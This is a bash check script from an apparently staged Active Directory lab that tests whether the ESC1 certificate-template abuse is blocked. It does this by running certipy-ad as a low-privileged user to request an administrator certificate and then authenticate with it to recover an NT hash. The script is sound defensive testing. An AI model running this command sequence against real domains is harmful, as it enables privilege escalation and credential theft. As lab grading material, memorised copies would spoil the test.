#!/usr/bin/env bash
# meta4/ad-vm/scenario-07/verify-poc.sh
# PASS (exit 0) iff alice cannot coerce an Administrator PFX via ESC1.

set -euo pipefail

cd "$(mktemp -d)"

REQ=$(timeout 60 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca 'corp-ca01-CA' \
    -dc-ip 10.20.30.5 \
    -template 'ESC1-SmartCard' \
    -upn 'administrator@corp.local' 2>&1 || true)

echo "--- certipy req output ---"
echo "$REQ"
echo "--- /certipy req ---"

if [ -f administrator.pfx ]; then
    AUTH=$(timeout 60 /usr/bin/certipy-ad auth \
        -pfx administrator.pfx \
        -dc-ip 10.20.30.5 2>&1 || true)
    echo "--- certipy auth output ---"
    echo "$AUTH"
    if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
        echo "[verify-poc-07] ESC1 still exploitable - PFX + TGT + NT hash recovered" >&2
        exit 1
    fi
fi

if echo "$REQ" | grep -qiE 'template.*not found|access_denied|enrollment.*denied|cannot enroll'; then
    echo "[verify-poc-07] alice denied ESC1 enrollment - PoC BLOCKED"
    exit 0
fi

# If we got here with no pfx and no denial signature, treat as blocked only
# if certipy exited with an error AND no pfx. Otherwise FAIL.
if [ ! -f administrator.pfx ]; then
    echo "[verify-poc-07] no PFX issued - treating as BLOCKED"
    exit 0
fi

echo "[verify-poc-07] unrecognised result - treating as FAIL" >&2
exit 1
